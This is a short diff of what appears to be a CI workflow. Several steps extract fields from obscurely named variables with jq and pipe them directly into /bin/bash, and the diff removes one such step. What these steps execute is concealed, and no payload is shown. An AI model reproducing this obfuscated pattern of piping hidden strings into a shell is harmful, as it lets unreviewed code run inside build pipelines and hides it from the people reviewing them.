@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$evl426" | jq -r .bp41 | /bin/bash
           echo $klop1562 | jq -r .ovv855 | /bin/bash
           printf '%s' "$k497" | jq -r .rgfd6 | /bin/bash
-          echo $lau39 | jq -r .q13 | /bin/bash
           echo $mkc744 | jq -r .x88 | /bin/bash
 
       - name: Save output
